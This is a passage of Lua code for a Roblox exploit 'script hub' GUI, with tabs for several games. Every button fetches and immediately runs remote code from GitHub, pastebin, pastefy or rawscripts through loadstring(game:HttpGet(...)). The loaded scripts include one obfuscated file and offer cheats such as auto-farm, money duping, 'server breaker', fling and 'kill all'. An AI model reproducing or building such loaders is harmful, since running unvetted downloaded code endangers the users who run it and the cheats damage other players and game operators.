Tab1:AddButton({"The DarKones", function(Value)
loadstring(game:HttpGet('https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/refs/heads/main/99%20Nights%20In%20The%20Forest%20GUI'))()
print("Hello World!")
end}) 

Tab1:AddButton({"auto Farm and more", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/99-Nights-in-the-Forest-STRONGHOLDS-KEYLESS-auto-farm-bring-item-teleports-and-more-by-Moondiety-44416"))()
print("Hello World!")
end})

local Tab1 = Window:MakeTab({"doorsðŸšªðŸ‘", "doorsðŸšªðŸ‘"})

Tab1:AddButton({"KITTY CATS DOORS", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/CatEnddroid/Kitty-Cats-Doors-Beta/refs/heads/main/hub.lua"))()
print("Hello World!")
end})

Tab1:AddButton({"spawn tools", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Darli17/Entities/refs/heads/main/Tools"))()
print("Hello World!")
end})

Tab1:AddButton({"doors script", function(Value)
loadstring(game:HttpGet(('https://pastefy.app/awczkDwJ/raw'),true))()
print("Hello World!")
end})

Tab1:AddButton({"NullFire", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/NuIlFire/NullFire/main/loader.lua"))()
print("Hello World!")
end})

Tab1:AddButton({"saturn hub", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/JScripter-Lua/Saturn_Hub_Products/refs/heads/main/Saturn_Hub_Doors.lua"))() 
print("Hello World!")
end}) 

local Tab1 = Window:MakeTab({"glow a GardenðŸŒ»", "glow a GardenðŸŒ»"})

Tab1:AddButton({"auto Farm gui", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Grow-a-Garden-GAG-Auto-Farm-GUI-Keyless-41847"))()
print("Hello World!")
end})

Tab1:AddButton({"ffj1", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()
print("Hello World!")
end})

Tab1:AddButton({"glow a garden", function(Value)
loadstring(game:HttpGet("https://pastebin.com/raw/A7us0FyY", true))()
print("Hello World!")
end})

Tab1:AddButton({"jstarzz", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jstarzz/petmover/refs/heads/main/main.lua", true))()
print("Hello World!")
end})

Tab1:AddButton({"glow a Garden auto", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Grow-a-Garden-Best-Script-working-auto-53253"))()
print("Hello World!")
end})

Tab1:AddButton({"rift hub glow a garden", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Grow-a-Garden-Freeze-All-Pets-43750"))()
print("Hello World!")
end})

Tab1:AddButton({"infinite money dupe", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Grow-a-Garden-KEYLESS-Grow-a-garden-INFINITE-MONEY-DUPE-auto-farm-script-41396"))()
print("Hello World!")
end})

local Tab1 = Window:MakeTab({"natural disastreðŸŒ‹", "natural disastreðŸŒ‹"})

Tab1:AddButton({"xvc hub", function(Value)
loadstring(game:HttpGet("https://pastebin.com/raw/Piw5bqGq"))()
print("Hello World!")
end})

Tab1:AddButton({"null Fire solara", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fire-Hub-Solara-and-mobile-support-17673"))()
print("Hello World!")
end})

Tab1:AddButton({"nds hub", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Natural-Disaster-Survival-Katers-NDS-Hub-19533"))()
print("Hello World!")
end})

Tab1:AddButton({"jesus sobre a Ã¡gua", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Natural-Disaster-Survival-Choose-Map-NoFall-WaterWalk-7793"))()
print("Hello World!")
end})

Tab1:AddButton({"auto farm", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Natural-Disaster-Survival-Auto-Farm-5285"))()
print("Hello World!")
end})

Tab1:AddButton({"i was here", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Natural-Disaster-Survival-I-was-here-3355"))()
print("Hello World!")
end})

Tab1:AddButton({"comprehensive gui", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Comprehensive-GUI_182"))()
print("Hello World!")
end})

Tab1:AddButton({"free ballon giver", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Free-CLIENTSIDED-Balloon-Giver!_175"))()
print("Hello World!")
end})

Tab1:AddButton({"6 games", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Unique-Hub-v2-(6-Games)-2745"))()
print("Hello World!")
end})

Tab1:AddButton({"server breaker", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Natural-Disaster-Survival-natural-disaster-survival-server-breaker-53457"))()
print("Hello World!")
end})

Tab1:AddButton({"fe fling gui", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Flinger-GUI-WORKS-ANYWHERE-53326"))()
print("Hello World!")
end})

Tab1:AddButton({"blueRed hub", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-BlueRed-Hub-V21-48687"))()
print("Hello World!")
end})

Tab1:AddButton({"dollar hub", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Dollar-Hub-47561"))()
print("Hello World!")
end})

local Tab1 = Window:MakeTab({"R6 and r15â¬œ", "R6 and r15â¬œ"})

Tab1:AddButton({"hacker FE", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Legenda06/Client-Replication/main/Fe"))()
print("Hello World!")
end})

Tab1:AddButton({"FE MONSTER", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rTvXTs8F16D8D2oiLxZ62E1E9jT1we312yUyJr2h72Vwqr32l37rirU1S89hqRV7.lua.txt"))()
print("Hello World!")
end})

Tab1:AddButton({"change rig type", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Change-Rig-Type-29217"))()
print("Hello World!")
end})

Tab1:AddButton({"animate R6-R15 fe", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-LX63-FE-animate-R6-R15-1170"))()
print("Hello World!")
end})

Tab1:AddButton({"DcruzRace", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-DcruzRace-GUI-53539"))()
print("Hello World!")
end})

Tab1:AddButton({"fe laser r6", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Green-baseplate.-fe-laser-script-r6-53197"))()
print("Hello World!")
end})

Tab1:AddButton({"click fling", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-better-click-fling-universal-52247"))()
print("Hello World!")
end})

Tab1:AddButton({"fe ghost", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Ghost-51951"))()
print("Hello World!")
end})

Tab1:AddButton({"rscripter hub", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Rscripter-Hub-52549"))()
print("Hello World!")
end})

Tab1:AddButton({"rewind time", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Rewind-time-52957"))()
print("Hello World!")
end})

Tab1:AddButton({"combat r6", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Combat-Script-r6-Only-52184"))()
print("Hello World!")
end})

Tab1:AddButton({"r15 free bundles", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Free-Bundles-R15-3356"))()
print("Hello World!")
end})

Tab1:AddButton({"dog or cat R15", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-dog-or-cat-R15-ONLY-53314"))()
print("Hello World!")
end})

Tab1:AddButton({"roblox egor", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-roblox-egor-script-53041"))()
print("Hello World!")
end})

Tab1:AddButton({"head remover", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Head-Remover-51769"))()
print("Hello World!")
end})

Tab1:AddButton({"vr7", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/tomtom's-Place-VR7-51692"))()
print("Hello World!")
end})

Tab1:AddButton({"snake avatar", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Snake-Avatar-51248"))()
print("Hello World!")
end})

Tab1:AddButton({"script fe r15", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-SCRIPT-FE-R15-51561"))()
print("Hello World!")
end})

Tab1:AddButton({"fe dog", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Green-baseplate.-Fe-dog-by-me-and-someone-51615"))()
print("Hello World!")
end})

Tab1:AddButton({"best hub 50 scripts", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Best-hub-50-scripts-plus-50250"))()
print("Hello World!")
end})

Tab1:AddButton({"remains hub v2", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-RemainsHub-V2-50805"))()
print("Hello World!")
end})

Tab1:AddButton({"hamsterball", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Remade-hamsterball-script-41893"))()
print("Hello World!")
end})

Tab1:AddButton({"zero gravity", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Zero-Gravity-28484"))()
print("Hello World!")
end})

local Tab1 = Window:MakeTab({"murder Mystery 2ðŸ”ª", "murder Mystery 2ðŸ”ª"})

Tab1:AddButton({"instawin and xray", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-KEYLESS-InstaWin-AutoFarm-Kill-all-XRay-nd-more-by-Moondiety-48644"))()
print("Hello World!")
end})

Tab1:AddButton({"hack murder Mystery", function(Value)
loadstring(game:HttpGet("https://pastefy.app/XpdRjdYD/raw", true))()
print("Hello World!")
end})

Tab1:AddButton({"echelovanta", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/echelonvanta/Scripts/refs/heads/main/Loader"))()
print("Hello World!")
end})

Tab1:AddButton({"radeon hub", function(Value)
loadstring(game:HttpGet("https://pastebin.com/raw/v1LKQGxN", true))()
print("Hello World!")
end})

Tab1:AddButton({"become hub", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBossScript/BeeconHub/main/BeeconHub"))()
print("Hello World!")
end})

Tab1:AddButton({"combochronic vailt", function(Value)
loadstring(game:HttpGet("https://pastebin.com/raw/gE1u62QJ", true))()

--get key: https://discord.gg/4z4vjkRyTJ
print("Hello World!")
end})

Tab1:AddButton({"blind hub", function(Value)
loadstring(game:HttpGet("https://pastebin.com/raw/0zcsYxVu"))()
print("Hello World!")
end})

Tab1:AddButton({"solix hub", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/debunked69/Solixreworkkeysystem/refs/heads/main/solix%20new%20keyui.lua"))()
print("Hello World!")
end})

Tab1:AddButton({"foggy hub", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/FOGOTY/foggy-loader/refs/heads/main/loader"))()
print("Hello World!")
end})

local Tab1 = Window:MakeTab({"dead railsðŸ§Ÿâ€â™‚ï¸ðŸš‚", "dead railsðŸ§Ÿâ€â™‚ï¸ðŸš‚"})

Tab1:AddButton({"nathub", function(Value) loadstring(game:HttpGet("https://raw.githubusercontent.com/ArdyBotzz/NatHub/refs/heads/master/NatHub.lua"))()
print("Hello World!")
end})

Tab1:AddButton({"dead rails hack mod", function(Value)
loadstring(game:HttpGet("https://pastebin.com/raw/9xvD1pig", true))()
print("Hello World!")
end})

Tab1:AddButton({"auto ufo challenge", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/yoursvexyyy/deadrails/refs/heads/main/autoufo"))()
print("Hello World!")
end})

Tab1:AddButton({"tn hub", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/thiennrb7/Script/refs/heads/main/Bringall"))()
print("Hello World!")
end})

Tab1:AddButton({"hoho Dead rails", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
print("Hello World!")
end})

Tab1:AddButton({"moon hub", function(Value)
loadstring(game:HttpGet('https://raw.githubusercontent.com/m00ndiety/Moondiety/refs/heads/main/Loader'))()
print("Hello World!")
end})